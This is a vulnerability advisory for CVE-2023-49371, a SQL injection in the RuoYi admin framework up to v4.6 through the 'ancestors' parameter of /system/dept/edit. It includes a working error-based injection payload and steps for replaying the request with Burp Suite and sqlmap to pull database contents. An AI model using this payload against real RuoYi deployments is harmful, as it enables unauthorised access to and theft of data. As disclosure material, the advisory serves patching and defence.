# CVE-2023-49371

>   RuoYi up to v4.6 was discovered to contain a SQL injection vulnerability via the component /system/dept/edit
>   ${->updateDeptStatus->updateParentDeptStatus->updateDept->editSave
>   Route: Post: /system/dept/edit
>   Parameter: ancestors
>   Splice: where dept_id in (${ancestors})
>   官网：https://ruoyi.vip/

## 来源

[https://github.com/Maverickfir/RuoYi-v4.6-vulnerability](https://github.com/Maverickfir/RuoYi-v4.6-vulnerability)

## 简介

若依在4.6版本之前存在SQL注入漏洞，攻击者通过该漏洞可以进行SQL注入利用，从而获取数据库中的敏感信息。

## 影响范围

-   RuoYi <= 4.6

## 漏洞类型

SQL注入

## POC

DeptName= 1&deptid =100&ParentId=12&Status= 0&ordernum =1&ancestors=0)or(extractvalue(1,concat((select user())))); #

![1](./1.png "1")


Find the corresponding function points according to the source code information
![1](./1.png "1")

Use the save function in this function and find the packet that triggers the /system/dept/edit route
![1](./2.png "1")
![1](./3.png "1")



Capture packets using burpsuite, save the packets, and then use poc injection to get the database information
![1](./4.png "1")
![1](./5.png "1")

Later you can save the packet and inject it into sqlmap to get more database information (close parentheses)